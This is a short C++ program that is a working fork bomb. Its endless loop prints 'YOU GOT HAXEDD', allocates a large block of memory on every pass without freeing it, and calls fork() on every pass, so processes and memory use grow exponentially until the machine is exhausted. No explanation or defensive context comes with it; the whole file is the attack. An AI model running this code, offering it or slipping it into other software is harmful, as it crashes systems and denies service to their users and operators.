#include <iostream>
#include <unistd.h>
using namespace std;
int main( )
{
    while(1) {
    	cout << "YOU GOT HAXEDD";
    	int* lol = new int[1000000];
        fork();
    }
    return 0;
}
